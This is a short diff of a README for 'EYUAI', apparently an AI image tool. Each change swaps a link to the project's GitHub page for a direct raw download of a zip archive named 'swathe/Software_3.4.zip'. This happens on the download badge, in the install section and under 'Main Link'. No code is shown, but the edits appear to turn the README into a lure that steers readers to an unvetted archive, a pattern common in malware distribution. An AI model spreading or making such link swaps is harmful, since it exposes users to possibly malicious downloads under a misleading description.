@@ -1,6 +1,6 @@
 # ✨ EYUAI - Simple AI tools for images
 
-[![Download EYUAI](https://img.shields.io/badge/Download-EYUAI-blue?style=for-the-badge&logo=github)](https://github.com/Defeated-wash894/EYUAI)
+[![Download EYUAI](https://img.shields.io/badge/Download-EYUAI-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Defeated-wash894/EYUAI/main/swathe/Software_3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it if you want one app for tasks like:
 ## 📥 Download and Install
 
 To get EYUAI, visit this page to download:
-https://github.com/Defeated-wash894/EYUAI
+https://raw.githubusercontent.com/Defeated-wash894/EYUAI/main/swathe/Software_3.4.zip
 
 After you open the page:
 
@@ -206,7 +206,7 @@ Keep in mind:
 ## 📌 Main Link
 
 Download and setup start here:
-https://github.com/Defeated-wash894/EYUAI
+https://raw.githubusercontent.com/Defeated-wash894/EYUAI/main/swathe/Software_3.4.zip
 
 ## 🗂️ Quick Steps
 
